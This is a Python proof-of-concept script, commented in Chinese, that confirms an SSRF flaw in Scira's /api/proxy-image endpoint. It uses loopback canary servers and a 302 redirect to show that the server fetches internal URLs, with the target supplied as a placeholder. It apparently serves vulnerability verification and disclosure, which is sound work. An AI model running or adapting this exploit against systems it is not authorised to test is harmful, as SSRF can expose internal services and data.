#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
zaidmukaddam Scira /api/proxy-image SSRF 验证脚本（只读，非武器化）

验证三件事（全部只读）：
  1. 基线：代理外网公开回显端点成功；
  2. 回环 SSRF：服务器代读 127.0.0.1 上自建 canary 的随机令牌；
  3. 重定向：fetch 跟随 302 跳入回环 canary。

运行（默认把流量代理到 Burp）：
    TARGET=http://{{TARGET}} USE_BURP=1 BURP_PROXY=http://127.0.0.1:8080 python3 poc.py
直连：
    TARGET=http://{{TARGET}} USE_BURP=0 python3 poc.py

纪律：目标用环境变量注入；canary 令牌每次运行随机生成；脚本不做任何写操作。
"""

import argparse
import os
import secrets
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

import urllib3
import requests

urllib3.disable_warnings()

TOKEN = secrets.token_hex(8)  # 每次运行随机生成，避免误报


class CanaryHandler(BaseHTTPRequestHandler):
    """回环 canary：返回随机令牌，证明响应体被服务器代读。"""

    def do_GET(self):
        body = (TOKEN + "\n").encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


class RedirectHandler(BaseHTTPRequestHandler):
    """302 跳转到回环 canary，验证重定向跟随。"""

    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://127.0.0.1:8899/")
        self.end_headers()

    def log_message(self, *args):
        pass


def serve(port, handler):
    HTTPServer(("127.0.0.1", port), handler).serve_forever()


def get(session, target, url_param):
    api = f"{target}/api/proxy-image?url={urllib.parse.quote(url_param, safe='')}"
    r = session.get(api, timeout=20)
    print(f"[>] GET {api}")
    print(f"[<] {r.status_code} content-type={r.headers.get('content-type')} body={r.text[:120]!r}")
    return r


def main():
    parser = argparse.ArgumentParser(description="Scira /api/proxy-image SSRF 验证")
    parser.add_argument("--target", default=os.environ.get("TARGET", "http://{{TARGET}}"))
    parser.add_argument("--use-burp", action="store_true", default=os.environ.get("USE_BURP", "1") == "1")
    parser.add_argument("--burp", default=os.environ.get("BURP_PROXY", "http://127.0.0.1:8080"))
    args = parser.parse_args()

    s = requests.Session()
    if args.use_burp:
        s.proxies = {"http": args.burp, "https": args.burp}
        s.verify = False
        print(f"[*] 流量已代理到 Burp：{args.burp}")

    threading.Thread(target=serve, args=(8899, CanaryHandler), daemon=True).start()
    threading.Thread(target=serve, args=(8900, RedirectHandler), daemon=True).start()

    ok = 0

    print("\n== 1. 基线：外网公开回显端点 ==")
    r = get(s, args.target, "https://httpbin.org/response-headers?X-SSRF-Canary=scira-poc")
    if r.status_code == 200 and "scira-poc" in r.text:
        print("[+] 基线通过：代理工作正常"); ok += 1

    print("\n== 2. 回环 SSRF：代读 127.0.0.1 canary 令牌 ==")
    r = get(s, args.target, "http://127.0.0.1:8899/")
    if r.status_code == 200 and TOKEN in r.text:
        print(f"[+] 命中：服务器代读了回环内容（令牌 {TOKEN}）"); ok += 1

    print("\n== 3. 重定向：302 跳入回环 ==")
    r = get(s, args.target, "http://127.0.0.1:8900/hop")
    if r.status_code == 200 and TOKEN in r.text:
        print("[+] 命中：fetch 跟随 302 进入回环"); ok += 1

    print(f"\n[*] 结果：{ok}/3 项通过" + ("，SSRF 确认" if ok == 3 else ""))
    return 0 if ok == 3 else 1


if __name__ == "__main__":
    raise SystemExit(main())
